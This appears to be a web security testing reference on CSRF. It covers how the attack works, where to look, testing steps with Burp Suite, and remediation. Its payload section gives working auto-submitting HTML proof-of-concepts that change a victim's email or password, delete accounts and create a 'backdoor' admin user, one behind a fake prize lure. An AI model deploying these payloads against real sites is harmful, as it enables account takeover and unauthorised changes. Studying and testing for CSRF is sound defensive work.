# CSRF on State-Changing Actions

## Overview
Cross-Site Request Forgery (CSRF) is an attack that tricks an authenticated user's browser into making an unintended HTTP request to a web application, causing the application to execute a state-changing action using the victim's authenticated session. The application cannot distinguish the forged request from a legitimate one because it relies solely on cookies (which browsers automatically include) for authentication, without verifying that the request originated from the application's own pages. CSRF bypasses same-origin policy because it exploits the browser's automatic cookie inclusion, not data access.

## How It Works
When a user is authenticated to a web application, their browser stores a session cookie. If the application does not implement CSRF protections, any page on any origin can craft an HTTP request to that application, and the victim's browser will automatically include the session cookie. The attacker embeds a request (as a form, image tag, or JavaScript fetch) in a page they control, lures the victim there, and the browser executes the request with the victim's full credentials. The application receives an authenticated-looking request that the victim never intentionally sent.

## Impact
- Password or email address change — account takeover
- Fund transfer, order placement, subscription change — financial impact
- Deletion of data, records, or accounts
- Privilege escalation by triggering admin actions
- Adding attacker-controlled email/phone to victim account (for account recovery takeover)
- Creating new admin users
- Any action the victim can perform while authenticated

## Where to Look
- Password change forms (especially without "current password" re-authentication)
- Email/username change functionality
- Account deletion or data export triggers
- Profile update forms (name, address, avatar)
- Payment or fund transfer flows
- Admin actions: user management, permission changes, configuration updates
- "Add trusted device" or "add recovery email" flows
- API endpoints that perform state changes via GET or POST without CSRF tokens
- Any form submission that changes server-side state and lacks a CSRF token in the request

## Testing Steps
1. Identify all state-changing functionality in the application (everything that sends POST, PUT, PATCH, DELETE requests — and also state-changing GETs).
2. For each endpoint, inspect the request in Burp for CSRF tokens: look in form fields (`__RequestVerificationToken`, `csrf_token`, `_token`), request headers (`X-CSRF-Token`, `X-Requested-With`).
3. If no token is present, the endpoint is potentially vulnerable — proceed to PoC.
4. If a token is present, attempt the bypass techniques in related files (removal, prediction, reuse).
5. Build a PoC HTML page (see Payloads section) that auto-submits the action.
6. Open the PoC in a browser where you are authenticated to the target — verify the action executes.
7. Confirm impact: did the state change occur? (Check password was changed, user was created, etc.)
8. Test GET-based state changes: can an `<img src="https://victim.com/delete?id=123">` tag trigger the action?

## Payloads / Techniques

**Basic POST CSRF PoC (HTML auto-submit form):**
```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://victim.com/account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="confirm_email" value="attacker@evil.com">
  </form>
</body>
</html>
```

**GET-based CSRF (via image tag):**
```html
<img src="https://victim.com/admin/delete-user?id=42" width="0" height="0">
```

**GET-based CSRF (via script src):**
```html
<script src="https://victim.com/account/logout"></script>
```

**Password change CSRF PoC:**
```html
<!DOCTYPE html>
<html>
<body>
<h1>You've won a prize! Claim it below:</h1>
<form id="csrf-form" method="POST" action="https://victim.com/account/change-password">
  <input type="hidden" name="new_password" value="H4cked!23">
  <input type="hidden" name="confirm_password" value="H4cked!23">
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
</body>
</html>
```

**Multipart form CSRF PoC:**
```html
<form method="POST" action="https://victim.com/profile/update" enctype="multipart/form-data">
  <input type="hidden" name="name" value="Hacked">
  <input type="hidden" name="phone" value="+1234567890">
  <input type="submit" value="Submit">
</form>
<script>document.forms[0].submit();</script>
```

**Fetch-based CSRF (requires CORS misconfiguration to read response, but state change still occurs):**
```html
<script>
fetch('https://victim.com/api/user/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=attacker%40evil.com'
});
</script>
```

**CSRF via XMLHttpRequest:**
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://victim.com/account/delete');
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('confirm=yes');
</script>
```

**Create new admin user (if endpoint is unprotected):**
```html
<form method="POST" action="https://victim.com/admin/users/create">
  <input type="hidden" name="username" value="backdoor">
  <input type="hidden" name="password" value="backdoor123">
  <input type="hidden" name="role" value="admin">
</form>
<script>document.forms[0].submit();</script>
```

## Burp Suite Tips
- Use **Burp's "Engagement Tools" > "Generate CSRF PoC"** (right-click on any request in Proxy history) to automatically create a CSRF PoC HTML form — one of the fastest ways to build a PoC.
- The generated PoC appears in a new window; click "Test in browser" to immediately test it using Burp's browser.
- In **Repeater**, delete the CSRF token value (leave the parameter but empty the value) and resend — if the request succeeds, the token validation is broken.
- Remove the entire CSRF token parameter in Repeater — if still successful, there is no server-side validation.
- Use **Burp Scanner** (Pro) — it automatically tests for missing CSRF protections on all observed state-changing requests.
- Check **Proxy HTTP history** — filter by method (POST/PUT/PATCH/DELETE) and review each request for the presence of CSRF tokens or `X-Requested-With` headers.

## Tools
- Burp Suite Pro (CSRF PoC Generator, Scanner)
- OWASP ZAP (Active Scanner includes CSRF tests)
- CSRFtester — https://wiki.owasp.org/index.php/Category:OWASP_CSRFTester_Project
- XSRFProbe — https://github.com/0xInfection/XSRFProbe
- curl (for manual endpoint testing)

## Remediation
- **Synchronizer Token Pattern**: Generate a cryptographically random, per-session (or per-request) CSRF token. Embed it in every state-changing form as a hidden field and in the `X-CSRF-Token` header for AJAX requests. Validate it server-side on every state-changing request.
- **SameSite Cookie attribute**: Set `SameSite=Lax` (minimum) or `SameSite=Strict` on session cookies. `Lax` prevents CSRF for POST requests from cross-site navigations. `Strict` prevents all cross-site cookie sending.
- **Double Submit Cookie**: Send the CSRF token both as a cookie and as a request parameter; the server verifies they match.
- **Custom request headers**: Require a custom header (e.g., `X-Requested-With: XMLHttpRequest`) on all AJAX state-changing requests — simple browsers cannot set custom headers cross-origin without CORS preflight, which the server rejects.
- **Re-authentication for sensitive actions**: For critical actions (password change, account deletion, fund transfer), require re-entry of the current password or MFA challenge.
- **Origin / Referer validation**: As a secondary check, validate the `Origin` or `Referer` header to confirm the request originated from the expected domain.

## References
https://owasp.org/www-community/attacks/csrf
https://portswigger.net/web-security/csrf
https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
